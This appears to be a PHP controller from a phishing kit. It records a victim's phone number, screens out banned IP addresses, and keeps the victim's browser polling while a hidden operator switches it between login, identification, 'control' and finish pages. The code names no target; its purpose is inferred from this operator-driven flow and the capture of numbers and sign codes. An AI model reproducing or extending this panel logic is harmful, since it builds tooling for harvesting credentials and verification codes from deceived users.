<?php

namespace App\Controllers\Sns;

use \Core\View;
use \App\Models\Sns\Sns;
use \App\Auth;

class Identification extends \Core\Controller
{
    public function indexAction()
    {
        if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_SESSION['uid']) && isset($_SESSION['pay']) && isset($_POST['number'])) {
            Sns::setDetails($_POST['number'], $_SESSION['uid']);
        } else {
            if (Sns::findBan($_SERVER['REMOTE_ADDR']) || !isset($_SESSION['pay']) || !Sns::checkPayment($this->route_params['id'])) {
                Sns::redirect();
            } else {
                Sns::setDetailsInformation($_SESSION['uid']);

                $check = Sns::getSignCode($_SESSION['uid']);

                View::render('Sns/identification.php', $data = [
                    'code' => $check
                ]);
            }
        }
    }

    public function checkAction()
    {
        if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_SESSION['uid']) && isset($_SESSION['pay'])) {
                $check = Sns::getPage($_SESSION['uid']);

                if ($check) {
                    if ($check == 'login') {
                        echo json_encode(['page' => 'login']);   
                        Sns::setLoginPage($_SESSION['uid'], null);
                    } else if ($check == 'identification') {
                        $check = Sns::getSignCode($_SESSION['uid']);
                        echo json_encode(['page' => 'identification', 'code' => $check]);   
                        Sns::setDetailsPage($_SESSION['uid'], null);
                    } else if ($check == 'control') {
                        echo json_encode(['page' => 'control']);
                        Sns::setControlPage($_SESSION['uid'], null);
                    } else if ($check == 'finish') {
                        echo json_encode(['page' => 'finish']);
                        Sns::setFinishPage($_SESSION['uid'], null);   
                        unset($_SESSION['pay']);
                        unset($_SESSION['uid']);
                    }
                } else {
                    echo json_encode(['page' => 'waiting']);
                }
           
        } else {
            Sns::redirect();
        }
    }
}